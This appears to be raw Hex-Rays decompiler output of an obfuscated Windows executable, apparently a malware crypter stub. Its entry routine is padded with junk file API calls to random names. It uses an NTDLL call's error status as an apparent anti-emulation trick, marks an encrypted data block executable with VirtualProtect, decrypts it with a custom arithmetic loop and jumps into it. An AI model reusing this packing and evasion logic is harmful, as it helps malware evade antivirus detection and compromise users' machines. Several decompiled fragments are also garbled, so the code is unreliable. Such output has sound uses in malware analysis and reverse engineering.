/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// void __usercall sub_401025(char@<al>, __int16 _DX@<dx>, int@<ecx>, int _EBX@<ebx>);
// void __usercall start(int@<ebx>);
_DWORD *__stdcall sub_4156B3(unsigned int, int, _DWORD *);

//-------------------------------------------------------------------------
// Data declarations

int dword_401000[9] =
{
  103872110,
  -583944234,
  -1282249190,
  1575427067,
  1839947825,
  898807691,
  -336177383,
  -1252818905,
  -189598119
}; // weak
_UNKNOWN loc_4155B1; // weak
// extern HANDLE (__stdcall *CreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern HANDLE (__stdcall *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern DWORD (__stdcall *GetFileType)(HANDLE hFile);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern BOOL (__stdcall *VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern LPSTR (__stdcall *GetCommandLineA)();
// extern DWORD (__stdcall *GetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh);
// extern DWORD (__stdcall *GetLastError)();
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
WCHAR aVusbyxux7hoqmp[] = L"\u7576\u6273\u7859\u5875\u6837\u716F\u504D\u2E44\u4A50M"; // idb
CHAR FileName[] = "KkrjHJx.AXq"; // idb
WCHAR aTinbrepoUxk[] = L"\u6954\u624E\u6572\u6F50\u552E\u6B78"; // idb
CHAR aTgzgltm7sthx5r[] = "tgzGltm7STHX5RQf7RtDuM.zof"; // idb
WCHAR aE9xhes9uylxzwt[] = L"\u3965\u6878\u5365\u7539\u6C59\u7A78\u5477\u662E\u3845"; // idb
CHAR ModuleName[] = "NTDLL.DLL"; // idb
WCHAR aUy5u20sj564nbl[] = L"\u7955\u7535\u3032\u6A73\u3635\u4E34\u6C42\u392E\u3033"; // idb
CHAR aSyn1cn2cv1vfpz[] = "sYn1Cn2Cv1VFPzL64Eb8e.fjP"; // idb
WCHAR aLt1odtsxuxersv[] = L"\u544C\u6F31\u7464\u5873\u7875\u5265\u5653\u724F\u3259\u3249\u2E38\u63336"; // idb
CHAR aShl4axmabjkkmg[] = "shl4axMABJKKmgrOhT0zIcW81s.74y"; // idb
CHAR aMok1zgxlvrplo2[] = "MOk1ZGxLvrplO2Q.23s"; // idb
CHAR a79ujDmj[] = "79UJ.Dmj"; // idb
CHAR ProcName[] = "ZwAllocateUserPhysicalPages"; // idb
CHAR a1smss4awnxexxn[] = "1SMSS4aWNxeXxnw.24L"; // idb


//----- (00401025) --------------------------------------------------------
void __usercall sub_401025(char a1@<al>, __int16 _DX@<dx>, int a3@<ecx>, int _EBX@<ebx>)
{
  unsigned __int8 v4; // al
  int v5; // ecx

  LOBYTE(_DX) = *(_BYTE *)(a3 + 53) & _DX;
  v4 = a1 | 0x47;
  v5 = a3 - 1;
  __outbyte(0xBCu, v4);
  BYTE1(v5) = 25;
  if ( v5 == 1 )
  {
    __asm
    {
      repne sub bl, [ebx]
      insd
    }
    *(_BYTE *)(_EBX - 128) += (v4 ^ 0xD6 | 0xC) + 39;
    __asm { iret }
  }
  JUMPOUT(0x400FF7);
}
// 401054: control flows out of bounds to 401055
// 401039: control flows out of bounds to 400FF7

//----- (00415286) --------------------------------------------------------
void __usercall start(int a1@<ebx>)
{
  char v1; // al
  __int16 v2; // dx
  int v3; // ecx
  const CHAR *v4; // [esp-28h] [ebp-6Ch]
  DWORD v5; // [esp-24h] [ebp-68h]
  DWORD v6; // [esp-20h] [ebp-64h]
  struct _SECURITY_ATTRIBUTES *v7; // [esp-1Ch] [ebp-60h]
  DWORD v8; // [esp-18h] [ebp-5Ch]
  DWORD v9; // [esp-14h] [ebp-58h]
  DWORD v10; // [esp-14h] [ebp-58h]
  int v11; // [esp-14h] [ebp-58h]
  struct _SECURITY_ATTRIBUTES *v12; // [esp-10h] [ebp-54h]
  void *v13; // [esp-10h] [ebp-54h]
  int v14; // [esp-Ch] [ebp-50h]
  DWORD v15; // [esp-Ch] [ebp-50h]
  int v16; // [esp-8h] [ebp-4Ch]
  DWORD v17; // [esp-8h] [ebp-4Ch]
  int v18; // [esp-4h] [ebp-48h]
  void *v19; // [esp-4h] [ebp-48h]
  void *v20; // [esp-4h] [ebp-48h]
  HANDLE FileA; // [esp+0h] [ebp-44h]
  HANDLE v22; // [esp+4h] [ebp-40h]
  HANDLE v23; // [esp+Ch] [ebp-38h]
  DWORD flOldProtect; // [esp+14h] [ebp-30h] BYREF
  HMODULE hModule; // [esp+18h] [ebp-2Ch]
  NTSTATUS (__stdcall *ZwAllocateUserPhysicalPages)(HANDLE, PULONG_PTR, PULONG_PTR); // [esp+1Ch] [ebp-28h]
  HANDLE v27; // [esp+20h] [ebp-24h]
  HANDLE FileW; // [esp+24h] [ebp-20h]
  HANDLE v29; // [esp+28h] [ebp-1Ch]
  int v30; // [esp+2Ch] [ebp-18h]
  HANDLE hObject; // [esp+30h] [ebp-14h]
  void (*v32)(void); // [esp+34h] [ebp-10h]
  HANDLE v33; // [esp+38h] [ebp-Ch]
  HANDLE v34; // [esp+3Ch] [ebp-8h]
  HANDLE hFile; // [esp+40h] [ebp-4h]

  GetCommandLineA();
LABEL_2:
  GetCommandLineA();
  GetLastError();
  FileA = CreateFileA(FileName, 0x20000000u, 5u, 0, 3u, 0x1A5u, 0);
  if ( FileA == (HANDLE)-1 )
  {
    v19 = 0;
    v17 = 0;
    v15 = 3;
    v12 = 0;
    v9 = 0;
    do
    {
      hFile = CreateFileW(aUy5u20sj564nbl, 0xE0000000, v9, v12, v15, v17, v19);
      hObject = CreateFileA(a79ujDmj, 0x40000000u, 6u, 0, 3u, 0, 0);
    }
    while ( hObject != (HANDLE)-1 );
    v20 = 0;
    goto LABEL_6;
  }
  while ( 1 )
  {
    GetFileSize(v29, 0);
    v32 = (void (*)(void))((char *)&loc_4155B1 + (_DWORD)v32);
    GetFileSize(v22, 0);
    v32();
    FileW = CreateFileW(aLt1odtsxuxersv, 0xA0000000, 4u, 0, 3u, 0x120u, 0);
    if ( FileW == (HANDLE)-1 )
      break;
    while ( 2 )
    {
      if ( CreateFileA(v4, v5, v6, v7, v8, v10, v13) != (HANDLE)-1 )
      {
        while ( 1 )
        {
          GetLastError();
          CloseHandle(hFile);
          CloseHandle(v23);
          GetFileType(hFile);
          GetFileSize(v23, 0);
          GetFileType(hFile);
          hModule = GetModuleHandleA(ModuleName);
          v29 = CreateFileW(aTinbrepoUxk, 0x60000000u, 0, 0, 3u, 0x84u, 0);
          do
            GetFileType(hObject);
          while ( CreateFileW(aE9xhes9uylxzwt, 0xE0000000, 7u, 0, 3u, 2u, 0) != (HANDLE)-1 );
          ZwAllocateUserPhysicalPages = (NTSTATUS (__stdcall *)(HANDLE, PULONG_PTR, PULONG_PTR))GetProcAddress(
                                                                                                  hModule,
                                                                                                  ProcName);
          v22 = CreateFileW(aVusbyxux7hoqmp, 0xE0000000, 5u, 0, 3u, 1u, 0);
          if ( v22 == (HANDLE)-1 )
            break;
LABEL_6:
          v23 = CreateFileA(aMok1zgxlvrplo2, 0, 7u, 0, 3u, 0x86u, v20);
          GetLastError();
          CloseHandle(hObject);
        }
        CloseHandle(hFile);
        GetFileType(v23);
        v34 = CreateFileA(aShl4axmabjkkmg, 0x20000000u, 5u, 0, 3u, 3u, 0);
        v27 = CreateFileA(a1smss4awnxexxn, 0x80000000, 1u, 0, 3u, 0x24u, 0);
        if ( v27 == (HANDLE)-1 )
        {
          v18 = 0;
          v33 = CreateFileA(aTgzgltm7sthx5r, 0x20000000u, 1u, 0, 3u, 0x106u, 0);
          v16 = 0;
          v14 = 0;
          v13 = 0;
          v10 = 386;
          v8 = 3;
          v7 = 0;
          v6 = 3;
          v5 = -536870912;
          v4 = aSyn1cn2cv1vfpz;
          continue;
        }
        goto LABEL_2;
      }
      break;
    }
    v30 = ((int (__cdecl *)(int, int, int))ZwAllocateUserPhysicalPages)(v14, v16, v18);
    GetFileType((HANDLE)0xFFFFFFFF);
    v32 = (void (*)(void))(v30 ^ 0xC0000005);
    CloseHandle(FileA);
  }
  GetCommandLineA();
  GetFileSize(FileA, 0);
  GetLastError();
  VirtualProtect(dword_401000, 0x14281u, 0x40u, &flOldProtect);
  GetFileSize(v27, 0);
  CloseHandle(FileA);
  v11 = v30;
  GetLastError();
  v32 = (void (*)(void))v30;
  CloseHandle(v22);
  v32 = (void (*)(void))((char *)v32 + 1073741819);
  GetFileSize(v33, 0);
  v32 = (void (*)(void))((char *)sub_4156B3 + (_DWORD)v32);
  ((void (__cdecl *)(int, int, int *))v32)(82561, v11, dword_401000);
  v1 = CloseHandle(FileA);
  sub_401025(v1, v2, v3, a1);
}
// 4152EF: variable 'v9' is possibly undefined
// 4152EF: variable 'v12' is possibly undefined
// 4152EF: variable 'v15' is possibly undefined
// 4152EF: variable 'v17' is possibly undefined
// 4152EF: variable 'v19' is possibly undefined
// 41534C: variable 'v20' is possibly undefined
// 415382: variable 'v23' is possibly undefined
// 415534: variable 'v4' is possibly undefined
// 415534: variable 'v5' is possibly undefined
// 415534: variable 'v6' is possibly undefined
// 415534: variable 'v7' is possibly undefined
// 415534: variable 'v8' is possibly undefined
// 415534: variable 'v10' is possibly undefined
// 415534: variable 'v13' is possibly undefined
// 41554B: variable 'v14' is possibly undefined
// 41554B: variable 'v16' is possibly undefined
// 41554B: variable 'v18' is possibly undefined
// 4155A5: variable 'v22' is possibly undefined
// 415694: variable 'v2' is possibly undefined
// 415694: variable 'v3' is possibly undefined
// 401000: using guessed type int dword_401000[9];

//----- (004156B3) --------------------------------------------------------
_DWORD *__stdcall sub_4156B3(unsigned int a1, int a2, _DWORD *a3)
{
  unsigned int v3; // ecx
  _DWORD *result; // eax

  v3 = a1 >> 2;
  result = a3;
  do
  {
    *result += a2;
    *result -= 1779743265;
    *result ^= a2;
    *result += a2;
    *result = -*result;
    *result -= a2;
    *result ^= 0xF82EAA2C;
    *result = __ROL4__(*result, 161);
    *result++ += 1728990628;
    --v3;
  }
  while ( v3 );
  return result;
}

// nfuncs=3 queued=3 decompiled=3 lumina nreq=0 worse=0 better=0
// ALL OK, 3 function(s) have been successfully decompiled
